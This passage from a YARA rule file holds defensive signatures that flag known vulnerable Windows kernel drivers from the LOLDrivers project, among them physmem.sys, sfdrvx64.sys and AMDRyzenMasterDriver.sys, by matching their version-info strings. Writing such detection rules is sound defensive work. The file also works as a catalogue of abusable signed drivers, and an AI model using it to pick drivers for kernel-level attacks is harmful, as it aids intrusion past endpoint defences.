} \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300033002e0030002e00360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300033002e0030002e0036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003200200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Almicosoftware_Sfdrvxsys_Speedfan_X_F4EE_RID3C5F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sfdrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:09:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053007000650065006400460061006e00200078003600340020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006c006d00690063006f00200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00580032002e00300033002e00310031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00580032002e00300033002e00310031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730066006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0053007000650065006400460061006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730066006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200041006c006d00690063006f00200053006f00660074007700610072006500200032003000300031002d0032003000310033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_5CFA_RID3BD4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:45:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003800200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Computerzsys_Ludashisystemdriver_898E_RID3B94 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:35:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e00310030002e003800330031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e00310030002e003800330031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003100300020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_AFDA_RID423B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:19:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300035002e00350034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300035002e00350034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Interfacecorporation_Cpxcsys_Gpcxcdiobmpcicpci_6386_RID40C2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CP2X72C.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:16:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004700500043002d0032005800370032004300200049002f004f0020004d006f00640075006c006500200044006500760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007400650072006600610063006500200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e00300032002e00330030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e00300032002e00330030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043005000320058003700320043002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004700500043002d00320058003700320043002000440049004f002d0042004d0028005000430049002f0043002d0050004300490029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043005000320058003700320043002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200032003000300031002c0020003200300031003400200049006e007400650072006600610063006500200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrddkprovider_Rtportsys_Windowsrddkdriver_C490_RID41C3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtport.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:59:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065006e006500720069006300200050006f0072007400200049002f004f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300030002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300030002e0032003100390035002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300030002e0032003100390035002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300030002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d006900630072006f0073006f0066007400200043006f00720070002e00200031003900380031002d0031003900390039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Arthurliberman_Alsysiosys_Alsysio_119C_RID3BA7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ALSysIO64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:38:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004c0053007900730049004f00360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041007200740068007500720020004c0069006200650072006d0061006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e00310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e00310031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004c0053007900730049004f00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004c0053007900730049004f00360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004c0053007900730049004f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300033002d003200300031003900200041007200740068007500720020004c0069006200650072006d0061006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_263E_RID3D0E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:38:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00320035002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00320035002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000300036002c002000320030003100300020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Almicosoftware_Sfdrvxsys_Speedfan_X_88FB_RID3C53 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sfdrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:07:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530070006500650064002000460061006e00200078003600340020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006c006d00690063006f00200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00580034002e00340033002e00300034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00580034002e00340033002e00300034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730066006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530070006500650064002000460061006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730066006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200041006c006d00690063006f00200053006f00660074007700610072006500200032003000300031002d0032003000310030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_E839_RID36F5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:18:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200066006f00720020004d00530049004300500055005f00430043 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Hilschergesellschaftfrsystemaoutomationmbh_Physmemsys_Physicalmemoryaccessdriver_C299_RID4F6A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - physmem.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:52:10\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0050006800790073006900630061006c0020004d0065006d006f0072007900200041006300630065007300730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00480069006c0073006300680065007200200047006500730065006c006c0073006300680061006600740020006600fc0072002000530079007300740065006d0061006f00750074006f006d006100740069006f006e0020006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0070006800790073006d0065006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0050006800790073006900630061006c0020004d0065006d006f0072007900200041006300630065007300730020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0070006800790073006d0065006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a9002000480069006c0073006300680065007200200047006500730065006c006c0073006300680061006600740020006600fc0072002000530079007300740065006d0061006f00750074006f006d006100740069006f006e0020006d00620048002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tenasyscorporation_Rtifsys_Intime_4CE8_RID3BC7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtif.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:43:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004e00740069006d006500200050006e00500020005200540020004b00650072006e0065006c00200049006e00740065007200660061006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00540065006e004100730079007300200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034003200300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002e0032002e00310031003200380035002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049004e00740069006d0065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300030002d0032003000310031002000620079002000540065006e004100730079007300200043006f00720070006f0072006100740069006f006e002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Amdryzenmasterdriversys_Amdryzenmasterservicedriver_AF10_RID4BF1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AMDRyzenMasterDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:13:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020003200300031003700200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_ADA4_RID3BCF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:45:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003800200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_9B2F_RID3D21 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:41:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00760069007200610067007400360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000310031002c002000320030003100330020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_F629_RID36B0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:06:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c002000580054006900650072002000530065007300730069006f006e0020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310032002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cyreninc_Amp_Cyrenamp_CBB8_RID3679 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - amp.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:57:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d00500020004d0069006e006900660069006c007400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0043005900520045004e00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0034002e00310031002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0034002e00310031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d0050 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005900520045004e00200041004d005000200035 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0061006d0070002e007300790073 } \n      $ = { 